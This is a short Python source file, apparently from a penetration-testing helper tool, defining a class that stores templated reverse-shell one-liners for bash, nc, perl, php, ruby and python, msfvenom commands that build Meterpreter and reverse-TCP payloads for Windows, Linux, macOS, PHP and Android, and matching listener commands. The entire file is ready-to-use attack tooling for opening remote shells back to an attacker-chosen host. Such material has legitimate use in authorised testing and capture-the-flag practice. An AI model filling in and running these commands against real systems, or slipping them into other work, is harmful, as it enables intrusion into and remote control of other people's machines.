class Shells:
	def __init__(self):
		self.reverse = {
			"bash": "sh -i >& /dev/tcp/[ip]/[port] 0>&1",
			"nc": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc [ip] [port] >/tmp/f",
			"perl": """perl -e 'use Socket;$i="[ip]";$p=[port];socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");};'""",
			"php": """php -r '$sock=fsockopen("[ip]",[port]);exec("/bin/sh -i <&3 >&3 2>&3");'""",
			"ruby": """ruby -rsocket -e'f=TCPSocket.open("[ip]",[port]).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'""",
			"python": """python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[ip]",[port]));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"""
		}

		self.msfvenom = {
			"windows_meterpreter": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=[ip] LPORT=[port] -f exe -o reverse.exe",
			"windows_reverse_tcp": "msfvenom -p windows/x64/shell/reverse_tcp LHOST=[ip] LPORT=[port] -f exe -o reverse.exe",
			"linux_reverse_tcp": "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=[ip] LPORT=[port] -f elf -o reverse.elf",
			"macos_meterpreter": "msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST=[ip] LPORT=[port] -f macho -o shell.macho",
			"macos_reverse_tcp": "msfvenom -p osx/x64/shell_reverse_tcp LHOST=[ip] LPORT=[port] -f macho -o shell.macho",
			"php_meterpreter": "msfvenom -p php/meterpreter_reverse_tcp LHOST=[ip] LPORT=[port] -f raw -o shell.php",
			"android_meterpreter": "msfvenom --platform android -p android/meterpreter/reverse_tcp LHOST=[ip] LPORT=[port] R -o malicious.apk"
		}

		self.listener = {
			"nc": "nc -lnvp [port]",
			"pwncat": "pwncat-cs -lp [port]",
			"msfconsole": "msfconsole -q -x 'use exploit/multi/handler; set LHOST [ip]; set LPORT [port]; run'"
		}